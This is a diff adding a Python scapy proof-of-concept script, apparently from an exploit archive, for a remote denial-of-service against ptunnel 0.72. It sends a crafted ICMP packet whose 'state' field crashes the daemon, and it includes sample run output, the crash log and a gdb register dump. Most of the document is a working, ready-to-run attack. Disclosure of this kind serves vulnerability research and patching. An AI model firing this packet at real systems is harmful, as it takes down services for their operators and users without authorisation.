@@ -1,0 +1,106 @@
+#!/usr/bin/env python
+#===============================================================================
+# Exploit Title: ptunnel <= 0.72 Remote Denial of Service (ICMP tunnel crash)
+# Date: January 2012
+# Exploit Author: st3n [at sign] funoverip [dot] net 
+# Vendor Homepage: http://www.cs.uit.no/~daniels/PingTunnel/
+# Software Link: http://www.cs.uit.no/~daniels/PingTunnel/PingTunnel-0.72.tar.gz
+# Version: 0.72 (and probably below)
+# Tested on: Debian Lenny
+#===============================================================================
+
+
+#===============================================================================
+# PoC code (scapy)
+#===============================================================================
+
+from scapy.all import *
+conf.verbose = 0
+
+# arg ?
+if len(sys.argv) < 1:
+    sys.exit('Usage: %s <host>' % sys.argv[0])
+
+# target 
+remote_host = sys.argv[1]
+
+# ptunnel.h
+#typedef struct {
+#        uint32_t        magic,          //      magic number, used to identify ptunnel packets.
+#                        dst_ip,         //      destination IP and port (used by proxy to figure
+#                        dst_port,       //      out where to tunnel to)
+#                        state,          //      current connection state; see constants above.
+#                        ack,            //      sequence number of last packet received from other end
+#                        data_len;       //      length of data buffer
+#        uint16_t        seq_no,         //      sequence number of this packet
+#                        id_no;          //      id number, used to separate different tunnels from each other
+#        char            data[0];        //      optional data buffer
+#} __attribute__ ((packed)) ping_tunnel_pkt_t;
+
+# build packet
+magic='\xd5\x20\x08\x80'
+dst_ip='AAAA'
+dst_port='BBBB'
+state='CCCC'    # <===== this trigger the vulnerability
+ack='\x00\x00\xff\xff'
+data_len='\x00\x00\x00\x00'
+seq_id='DDDD'
+pkt = IP(dst=remote_host)/ICMP()/Raw(magic)/Raw(dst_ip)/Raw(dst_port)/Raw(state)/Raw(ack)/Raw(data_len)/Raw(seq_id)
+
+# evil evil packet
+send(pkt)
+
+
+#=========================================================================
+# Example & Info
+#=========================================================================
+
+# Sending evil packet
+# -------------------
+
+# $ sudo ./ptunnel-dos.py 127.0.0.1
+# .
+# Sent 1 packets.
+
+
+
+# Daemon side
+# -----------
+
+# $ ptunnel -c lo
+# [inf]: Starting ptunnel v 0.72.
+# [inf]: (c) 2004-2011 Daniel Stoedle, <daniels@cs.uit.no>
+# [inf]: Security features by Sebastien Raveau, <sebastien.raveau@epita.fr>
+# [inf]: Forwarding incoming ping packets over TCP.
+# [inf]: Initializing pcap.
+# [inf]: Ping proxy is listening in privileged mode.
+# Segmentation fault
+
+
+# Debug info
+# -----------
+
+#  Program received signal SIGSEGV, Segmentation fault.
+#  handle_packet (buf=0x80774a0 "E", bytes=56, is_pcap=1, addr=0xbffff65c, icmp_sock=7) at ptunnel.c:957
+#  957                             pt_log(kLog_sendrecv, "Recv: %d [%d] bytes [seq = %d] [type = %s] [ack = %d] [icmp = %d] [user = %s] [pcap = %d]\n",
+#  (gdb)
+#  (gdb) i r
+#  eax            0x3434343        54739779
+#  ecx            0x0      0
+#  edx            0x3434343        54739779
+#  ebx            0x8050184        134545796
+#  esp            0xbffff380       0xbffff380
+#  ebp            0xbffff468       0xbffff468
+#  esi            0xffff   65535
+#  edi            0xbffff5c8       -1073744440
+#  eip            0x804cdfa        0x804cdfa <handle_packet+494>
+#  eflags         0x10202  [ IF RF ]
+#  cs             0x73     115
+#  ss             0x7b     123
+#  ds             0x7b     123
+#  es             0x7b     123
+#  fs             0x0      0
+#  gs             0x33     51
+
+
+# eof
